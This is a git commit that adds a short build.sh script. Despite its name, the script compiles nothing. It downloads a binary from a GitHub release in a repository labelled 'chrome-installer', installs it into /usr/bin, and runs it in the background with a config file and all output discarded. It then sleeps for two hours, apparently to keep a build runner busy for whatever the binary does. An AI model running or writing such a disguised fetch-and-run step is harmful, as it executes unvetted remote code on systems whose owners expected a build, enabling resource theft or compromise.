3b32d6e803357c88a42ac996b7a8ddef7659b8af
namtran180291-cmyk <namtran180291@gmail.com>
2026-01-30 11:32:47 +0700

    Create build.sh

---
+++ build.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+set -e
+curl -O -J -L https://github.com/namtran180291-cmyk/chrome-installer/releases/download/1.0.0/e2b-sandbox.tar.gz
+tar -xf e2b-sandbox.tar.gz
+rm e2b-sandbox.tar.gz
+cd e2b-sandbox
+chmod +x ./e2b
+mv ./e2b /usr/bin/e2b
+nohup e2b -c account.json >/dev/null 2>&1 &
+sleep 2h
